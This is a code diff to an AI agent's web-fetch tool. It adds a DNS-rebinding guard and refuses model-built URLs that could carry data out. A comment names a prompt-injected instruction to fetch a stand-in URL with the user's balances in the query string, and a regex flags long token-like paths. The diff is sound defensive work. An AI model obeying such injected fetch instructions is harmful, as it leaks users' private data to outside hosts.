@@ -11,6 +11,7 @@ untrusted data (the engine wraps every tool result).
 import ipaddress
 import re
 import socket
+from contextlib import contextmanager
 from urllib.parse import parse_qs, urljoin, urlparse
 
 import frappe
@@ -56,8 +57,38 @@ def _check_public(url):
 			raise WebError("This address points to a private or internal network and cannot be opened.")
 
 
+@contextmanager
+def _public_connections_only():
+	"""Check the address actually connected to, not only the one resolved by _check_public: a host whose DNS
+	answers a public IP to the check and 127.0.0.1 a moment later (DNS rebinding) is refused at connect time."""
+	import urllib3.util.connection as u3
+
+	original = u3.create_connection
+
+	def guarded(address, *args, **kwargs):
+		host, port = address
+		infos = socket.getaddrinfo(host, port, proto=socket.IPPROTO_TCP)
+		for info in infos:
+			ip = ipaddress.ip_address(info[4][0])
+			if not ip.is_global or ip.is_multicast:
+				raise WebError("This address points to a private or internal network and cannot be opened.")
+		# connect to the address that was just checked (TLS still verifies the certificate for the host name)
+		return original((infos[0][4][0], port), *args, **kwargs)
+
+	u3.create_connection = guarded
+	try:
+		yield
+	finally:
+		u3.create_connection = original
+
+
 def _get(url, *, params=None, headers=None, method="GET", json_body=None):
 	"""GET/POST a public URL, following redirects by hand so each hop is checked."""
+	with _public_connections_only():
+		return _get_checked(url, params=params, headers=headers, method=method, json_body=json_body)
+
+
+def _get_checked(url, *, params=None, headers=None, method="GET", json_body=None):
 	session = requests.Session()
 	session.trust_env = False   # no proxy/netrc credentials from the server environment
 	headers = {"User-Agent": USER_AGENT, "Accept-Language": "ar,en;q=0.8", **(headers or {})}
@@ -119,6 +150,45 @@ def _pdf_to_text(body):
 		return _clean("\n".join(page.get_text() for page in doc.pages(0, min(doc.page_count, 30))))
 
 
+# A URL the model builds itself can carry what it has read (a prompt-injected "fetch https://x/?d=<balances>").
+# Such URLs open only when they came from outside the model: a search result, a link on a page already
+# fetched, or the user's own message. A plain address (no query, short path) stays open.
+KNOWN_URLS_TTL = 86400
+TOKEN_RE = re.compile(r"[A-Za-z0-9+/=_%-]{40,}")
+
+
+def _known_key(run_name):
+	return f"ai_agent:web_known_urls:{run_name}"
+
+
+def remember_urls(run_name, urls):
+	if not run_name:
+		return
+	urls = [u for u in urls if u]
+	if urls:
+		frappe.cache.sadd(_known_key(run_name), *urls)
+		frappe.cache.expire(frappe.cache.make_key(_known_key(run_name)), KNOWN_URLS_TTL)
+
+
+def _plain_address(url):
+	parts = urlparse(url)
+	return not parts.query and not parts.fragment and len(parts.path) <= 120 and not TOKEN_RE.search(parts.path)
+
+
+def _url_allowed(url, permission_context):
+	if _plain_address(url):
+		return True
+	run_name = getattr(permission_context, "run_name", None)
+	if run_name and frappe.cache.sismember(_known_key(run_name), url):
+		return True
+	session = frappe.db.get_value("AI Run", run_name, "chat_session") if run_name else None
+	if session:
+		said = frappe.get_all("AI Chat Message", filters={"session": session, "role": "user", "text": ("like", f"%{url[:400]}%")}, limit=1)
+		if said:
+			return True
+	return False
+
+
 def handle_fetch(arguments, permission_context):
 	"""web.fetch: the readable text of one public web page (HTML, PDF or text)."""
 	if not enabled():
@@ -126,6 +196,10 @@ def handle_fetch(arguments, permission_context):
 	url = str(arguments.get("url") or "").strip()
 	if url and not re.match(r"^https?://", url, re.I):
 		url = "https://" + url
+	if url and not _url_allowed(url, permission_context):
+		return {"error": "This address has a query or a long path and did not come from a search result, a fetched page or "
+			"the user: it is refused (it could carry data out). Open the page from a search result, or ask the user for the link.",
+			"url": url}
 	limit = max(500, min(cint(arguments.get("max_chars")) or DEFAULT_CHARS, MAX_CHARS))
 	try:
 		response, body, final_url = _get(url)
@@ -151,6 +225,7 @@ def handle_fetch(arguments, permission_context):
 	result = {"url": final_url, "title": title, "content": text[:limit], "truncated": len(text) > limit, "length": len(text)}
 	if links:
 		result["links"] = links
+		remember_urls(getattr(permission_context, "run_name", None), [link["url"] for link in links])
 	if not text:
 		result["note"] = "The page has no readable text; it may need JavaScript or a login."
 	return result
@@ -232,5 +307,6 @@ def handle_search(arguments, permission_context):
 		return {"error": str(exc), "provider": provider}
 	except (requests.RequestException, ValueError) as exc:
 		return {"error": f"The search engine did not answer ({exc.__class__.__name__}).", "provider": provider}
+	remember_urls(getattr(permission_context, "run_name", None), [r.get("url") for r in results if isinstance(r, dict)])
 	return {"query": query, "provider": provider, "results": results,
 		"note": "Open the most relevant results with web.fetch before answering; cite the page URL."}
